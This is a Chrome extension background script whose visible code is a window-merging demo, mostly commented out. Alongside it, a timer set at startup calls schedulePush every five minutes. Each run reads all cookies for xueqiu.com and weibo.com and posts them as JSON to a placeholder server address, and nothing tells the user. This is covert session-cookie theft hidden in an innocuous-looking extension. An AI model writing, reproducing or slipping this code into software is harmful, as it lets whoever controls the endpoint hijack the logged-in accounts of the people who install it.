async function start() {
  const current = await chrome.windows.getCurrent();
  console.log("current", current);
  const allTabs = await chrome.tabs.query({});
  // allTabs.forEach((tab) => {
  //   if (tab.windowId != current.id) {
  //     chrome.tabs.move(tab.id, {
  //       windowId: current.id,
  //       index: tab.index
  //     });
  //   }
  // });
}

// Set up a click handler so that we can merge all the windows.
chrome.action.onClicked.addListener(start);

// Show the demo page once the extension is installed
chrome.runtime.onInstalled.addListener((_reason) => {
  console.log("onInstalled", { _reason });
  //   chrome.tabs.create({
  //     url: "hello.html?_=" + JSON.stringify(_reason),
  //   });
});

chrome.tabs.onRemoved.addListener(function (tabId, removeInfo) {
  // var confirmClose = confirm('是否需要打开新的导航页');
  // if (confirmClose) {
  //   chrome.tabs.create({});
  // }
});

chrome.action.onClicked.addListener((tab) => {
  console.log("onClicked", tab);
});

function schedulePush() {
  let arr = [];
  arr.push("xueqiu.com");
  arr.push("weibo.com");
  for (let i = 0; i < arr.length; i++) {
    queyrCookie(arr[i]);
  }
}

async function queyrCookie(domain) {
  console.log({ domain });
  const cookies = await chrome.cookies.getAll({ domain });

  if (cookies.length === 0) {
    console.log("No cookies found");
  } else {
    let __text = "" + cookies.length + " cookies found\n";
    for (let i = 0; i < cookies.length; i++) {
      let __cookie = cookies[i];
      let __str = __cookie.name + "\t=\t" + __cookie.value;
      __text += __str + "\n";
    }
    console.log("cookie text: " + __text);

    const __json = {
      cookieArrText: JSON.stringify(cookies),
      domain: domain,
      type: "bg",
    };
    const __json_str = JSON.stringify(__json);
    let __url = "http://YOUR_API_ADDRESS"

    const __option = {
      method: "POST",
      body: __json_str,
      headers: {
        "Content-type": "application/json;charset=utf-8",
      },
      cache: "default", // *default, no-cache, reload, force-cache, only-if-cached
      credentials: "include", // include, *same-origin, omit
      redirect: "follow", // manual, *follow, error
      referrerPolicy: "no-referrer-when-downgrade", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    };

    fetch(__url, __option)
      .then((response) => response.json())
      .then((json) => console.log("resp.json", json))
      .catch((err) => console.log("Request Failed", err));
  }
}

function init() {
  let _5min = 5 * 60 * 1000;
  let _5s = 5 * 1000;
  setInterval(schedulePush, _5min);
}

init();
